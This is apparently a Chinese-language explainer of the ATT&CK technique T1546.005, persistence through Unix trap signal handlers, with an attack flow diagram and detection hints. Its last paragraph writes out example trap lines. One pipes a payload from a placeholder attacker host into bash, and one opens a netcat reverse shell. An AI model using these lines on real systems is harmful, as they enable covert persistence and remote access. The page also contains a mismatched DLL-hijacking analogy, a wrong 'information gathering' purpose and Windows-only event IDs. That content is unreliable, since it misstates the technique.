# Trap (T1546.005)

## 一句话通俗理解

> **Trap就是使用Unix trap命令捕获信号。**

## 这是什么？

**通俗解释：**
使用Unix trap命令捕获信号



> 🧪 **打个比方**：就像在Windows的DLL加载路径里放了一个同名恶意DLL——攻击者利用DLL劫持技术，让合法程序加载恶意的DLL文件。

**技术原理：**
T1546.005 是 事件触发执行（T1546）的子技术，专注于Trap这一特定方面。攻击者在持久化阶段，通过Trap来获取目标系统或组织的相关信息，为后续攻击步骤做准备。

**用途与影响：**
- 为后续攻击提供关键信息支撑
- 提高攻击的成功率和精准度
- 降低攻击被发现的概率

## 真实攻击流程

```mermaid
graph TD
    A["获得Linux系统Shell访问权限"] --> B["定位Shell配置文件（.bashrc等）"]
    B --> C["使用trap命令设置信号处理程序"]
    C --> D["捕获特定信号（EXIT/DEBUG/INT等）"]
    D --> E["Shell退出或执行命令时触发trap"]
    D --> F["trap处理程序执行恶意命令"]
    style C fill:#ff6b6b,stroke:#333,stroke-width:2px
```

**步骤详解：**

1. **获得Linux Shell访问** - 通过漏洞利用或SSH入侵获得目标系统的Shell访问权限
2. **定位配置文件** - 查找当前用户的~/.bashrc或~/.bash_profile配置文件
3. **设置trap命令** - 使用`trap 'malicious_command' SIGNAL`定义信号处理程序
4. **捕获特定信号** - 选择捕获EXIT（Shell退出）、DEBUG（每条命令执行前）或INT（中断）信号
5. **信号触发** - Shell退出或执行命令时，trap定义的信号被触发
6. **执行恶意命令** - trap处理程序执行反向Shell、数据窃取或下载payload等恶意操作

### 主机层检测

**Windows事件ID：**

- 事件ID 4688：可疑进程创建
- 事件ID 4104：PowerShell脚本块日志

**Linux日志：**

- 日志文件：`/var/log/syslog`
- 关键字段：可疑命令执行

### 应用层检测


**用人话说：** 就像在Shell脚本里设了一个"陷阱"——Unix的`trap`命令可以在Shell脚本收到特定信号（如Ctrl+C、退出、错误）时执行指定的操作。攻击者在恶意脚本中使用`trap 'malicious_command' EXIT`或`trap 'curl http://恶意地址/backdoor | bash' SIGINT`，当脚本执行完毕或用户中断时就会触发恶意操作。比如一个看起来人畜无害的备份脚本，结尾藏了`trap 'nc -e /bin/bash 攻击者IP 4444' EXIT`，脚本跑完后自动反弹Shell。因为trap是Shell内置命令，日志中只有正常脚本执行的记录。
